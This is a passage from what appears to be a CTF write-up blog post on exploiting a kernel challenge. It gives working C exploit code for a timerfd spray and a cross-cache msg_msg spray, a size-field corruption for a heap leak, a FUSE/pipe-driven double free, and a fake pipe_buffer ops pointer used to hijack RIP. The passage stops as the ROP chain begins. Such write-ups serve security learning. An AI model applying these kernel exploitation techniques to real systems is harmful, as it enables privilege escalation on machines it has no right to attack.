+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying timerfd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        timerfds[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">timerfd_create</span>(CLOCK_REALTIME, <span style="color:#ae81ff">0</span>); 
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">timerfd_settime</span>(timerfds[i],  <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>timerValue, NULL); 
+</span></span><span style="display:flex;"><span>    }   
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>We can then simply read the doc to leak a kernel pointer.</p>
+<h4 id="leaking-the-kernel-heap-with-msg_msg">Leaking the Kernel Heap with msg_msg</h4>
+<p>We now want to get a kernel heap leak in a kmalloc-cg-1024 cache, as that is where the pipe_buffer objects that we will later use in exploitation would be allocated (or at least this is what I intended, will explain more later). In order to do that, we are going to make use of struct msg_msg, which you can see below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> msg_msg {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head m_list; <span style="color:#75715e">// contains 2 pointers, next and prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">long</span> m_type;             <span style="color:#75715e">// message type
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">size_t</span> m_ts;		     <span style="color:#75715e">// message data size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> msg_msgseg <span style="color:#f92672">*</span>next; <span style="color:#75715e">// msg_msgseg contains more data from the same msg_msg if the size is very big
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>security;          <span style="color:#75715e">// selinux security pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* the actual message follows immediately */</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>struct msg_msg is an elastic object, and can have any size as long as it is above 0x30. The object can be allocated via the msgsnd() syscall, and freed via the msgrcv() syscall, and was originally intended for IPC communication via System V message queues. If the kernel was compiled with CONFIG_CHECKPOINT_RESTORE (which it was in this challenge), msgrcv() can also be used to leak data without freeing the msg_msg object.</p>
+<p>The struct list_head m_list contain the next and previous pointers to messages in the same queue (and messages do not have to be the same size). As such, we can use the next pointer in struct list_head to leak a kmalloc-cg-1024 address.</p>
+<p>This is when the cross cache attack comes in. Remember that the document data object was allocated with GFP_KERNEL, which means that it would end up in kmalloc-256 (a normal kmalloc cache), but the msg_msg object is allocated with GFP_KERNEL_ACCOUNT, which means that it would end up in a kmalloc-cg-x cache depending on its size. The general idea of the cross cache attack is to mess with the buddy allocator so that instead of being allocated into a cg cache, the msg_msg object will be allocated into the normal cache and reclaim the freed space after the timerfd_ctx object occupying the freed document data region is freed. You can check out <a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary">https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary</a> for more information about the cross cache attack, but I found that spraying a large number of objects in the normal kmalloc cache, freeing all of them, and spraying a large number of objects you want to occupy the victim object with works prefrectly well.</p>
+<p>We will first free all the timerfd_ctx objects in preparation for the msg_msg spray.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free timerfd objects
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing timerfd spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(timerfds[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We will then spray primary msg_msg objects of size 256 (which is the same size as the document data object), in the hopes that one of them will reclaim the freed space where the document data object was. In each of the message queues, we will then spray a secondary message of size 1024, so that the next pointer of the msg_msg objects will point to a kmalloc-cg-1024 address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Spray msg_msg to cross cache
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">667</span>, <span style="color:#e6db74">&#34;[+] Spraying primary msg_msg objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">667</span>, <span style="color:#e6db74">&#34;[+] Spraying secondary msg_msg objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_secondary));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#66d9ef">sizeof</span>(msg_secondary) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>This is the moment when we unblock /write1 by writing to the pipe via <code>write(fuse_pipe1[1], &quot;A&quot;, 1);</code>. After writing to the pipe, the read can read something from it too, hence the first write to unblock. If we look at the contents of the first write:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4343434343434343</span>; 
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x960</span>;
+</span></span></code></pre></div><p>At index 0x18, corresponding to m_ts, we have overwritten the original size of the msg_msg object (which was 0x100) to 0x960. Now, we can start leaking data via msg_msg. We first want to find out which of the msg_msg objects were corrupted, and I did that by reading from each of the msg_msg object using the MSG_COPY option, which allows me to read from the objects without freeing them. The m_type of the primary msg_msg objects in the spray were all set to 0x41; if there is an object where m_type is not 0x41, that is our target corrupted object.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Finding corrupted message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[i], <span style="color:#f92672">&amp;</span>message_leak, <span style="color:#66d9ef">sizeof</span>(message_leak) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>, MSG_COPY <span style="color:#f92672">|</span> IPC_NOWAIT) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msgrcv failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message_leak.mtype <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x41</span>) {
+</span></span><span style="display:flex;"><span>            corrupted_idx <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>I was then able to leak a huge number of bytes (greater than the original 0x100) from the corrupted msg_msg object, which thinks that its size is 0x960. From there, I leaked the next pointer of the next message (which points to a kmalloc-cg-1024 heap address, which will be our target for spraying pipe buffer objects), as well as another set of next and prev pointers which will be used later in the exploit. Here is the current state of the system (prev pointers not shown for simplicity):</p>
+<p><img src="/meowcrosoft_word_diagram1.jpg" alt="Diagram1"></p>
+<p>So remember when I said that the cross cache was the intended solution? Later on in the CTF, someone remarked that they did not have to spray a lot of msg_msg objects to reclaim the freed document data region. So, I went to check the challenge again, and the kmalloc-cg caches seem to be missing from /proc/slabinfo or /sys/kernel/slab 0.0 I am currently not sure why this is the case, though I suspect it may have something to do with cache aliasing, but I may update this blog post or write another one when I find out why. If anyone knows why, please let me know!</p>
+<h4 id="getting-a-double-free">Getting a Double Free</h4>
+<p>So here is how we are going to get a double free. We are going to first overwrite the next and prev pointer of the corrupted primary msg_msg object with the leaked next and free pointer by unblocking /write2. We are then going to free the secondary message belonging the primary msg_msg whose next and free pointer we leaked. Note that when freeing the secondary messages, they are located via the next pointer. If we wanted to instantly get the double free, we could free the secondary message which the next pointer of the corrupted primary msg_msg object is pointing to (which would be the already freed secondary message), but to not cause crashes, we will spray a fake secondary msg_msg of size 1024 over the freed area, and then free the second time (which is why we needed another set of next/prev pointers because they would be the next/prev pointers of the fake secondary message). After freeing for the second time, we will spray pipe_buf over the freed region of size 1024, and get to controlling RIP!</p>
+<p>Let&rsquo;s first talk about overwriting the next/prev pointer of the corrupted primary msg_msg object. We would do this with the next/prev pointers that we have leaked, but remember that previously, I mentioned that the contents of a FUSE file are &ldquo;fixed&rdquo; once the filesystem has been started in the setup phase. But fret not, there is a very cursed way of getting around this.</p>
+<p>Remember how we used pipes to block and unblock FUSE? Turns out, we can also use the pipes to send and receive data (which are what pipes are for). We will try to read from a pipe when a read from the FUSE file /write2 is performed (via <code>read(fuse_write2_data[0], &amp;lolText, 0x18);</code>), which will block. Then, after our leak and such is done, what we will do is that we will write the data which we want to overwrite next/prev in the corrupted msg_msg with into the pipe.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Build fuse_write2_data 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)buf)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> heap_addr;
+</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)buf)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> heap_prev;
+</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)buf)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fuse_write2_data[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x18</span>);
+</span></span></code></pre></div><p>That way, when the read from the pipe completes, and FUSE unblocks, it can use that data as the contents of the FUSE file, which will then be used to perform the write.</p>
+<p>At this point, this is the state of the system:</p>
+<p><img src="/meowcrosoft_word_diagram2.jpg" alt="Diagram2"></p>
+<p>We are then going to free the secondary message belonging to the next primary msg_msg.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free the next_idx secondary msg_msg first
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing the next_idx secondary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[next_idx], <span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#66d9ef">sizeof</span>(msg_secondary)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free fake msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>The system now looks like this:</p>
+<p><img src="/meowcrosoft_word_diagram3.jpg" alt="Diagram3"></p>
+<p>Then, we are going to spray a fake secondary msg_msg object via sk_buff. Note that I have set the security pointer to 0; I had to explicitly disable SELinux in the kernel config for this to work, or not there would be a NULL pointer dereference, and everything would explode. Theoretically we could leak a security pointer when we leak all the other stuff and use that as the security pointer, but I was lazy (whoops).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying sk_buff objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(secondary_buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(secondary_buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">build_msg_msg</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)secondary_buf, kheap_pt1, kheap_pt2, <span style="color:#ae81ff">1024</span> <span style="color:#f92672">-</span> MSG_MSG_SIZE, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> NUM_SKBUFFS; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(ss[i][<span style="color:#ae81ff">0</span>], secondary_buf, <span style="color:#66d9ef">sizeof</span>(secondary_buf)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The system after the spray:</p>
+<p><img src="/meowcrosoft_word_diagram4.jpg" alt="Diagram4"></p>
+<p>After that, we are going to free the fake secondary msg_msg by freeing the secondary message of the corrupted msg_msg object.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free the secondary message of corrupted_idx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing the corrupted_idx secondary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[corrupted_idx], <span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#66d9ef">sizeof</span>(msg_secondary)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free fake msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>The system now, with sk_buff pointing to the freed region:</p>
+<p><img src="/meowcrosoft_word_diagram5.jpg" alt="Diagram5"></p>
+<p>At this point, we can setup the pipe_buf spray via sk_buff:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying pipe_buf over freed 1024 area</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;ABC&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Free pipe_buffer objects
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing pipe_buffer objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> NUM_SKBUFFS; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(ss[i][<span style="color:#ae81ff">1</span>], secondary_buf, <span style="color:#66d9ef">sizeof</span>(secondary_buf)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] read&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Note that pipe buffer is allocated in kmalloc-cg-1024.</p>
+<h4 id="rop-time">ROP Time!!!</h4>
+<p>It is finally time to control RIP! We are going to make a fake pipe_buffer object with a fake pipe_buf_operations, where ops-&gt;release points to our first ROP gadget. Then, we are going to spray this fake pipe buffer object via sk_buff. To control RIP, all we need to do is to release the pipe buffer objects by closing the pipes.</p>
+<p>Another way to control RIP would be to spray seq_operations instead (the initial document data object size would need to be 32 in that case) and overwrite one of the function pointers, which someone did in the CTF.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(secondary_buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(secondary_buf));
+</span></span><span style="display:flex;"><span>    pbuf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> pipe_buffer <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf;
+</span></span><span style="display:flex;"><span>    pbuf<span style="color:#f92672">-&gt;</span>ops <span style="color:#f92672">=</span> heap_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x290</span>;
+</span></span><span style="display:flex;"><span>    ops <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x290</span>];
+</span></span><span style="display:flex;"><span>    ops<span style="color:#f92672">-&gt;</span>release <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x60ecea</span>; <span style="color:#75715e">// 0xffffffff8160ecea : push rsi ; jmp qword ptr [rsi + 0x39]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop;
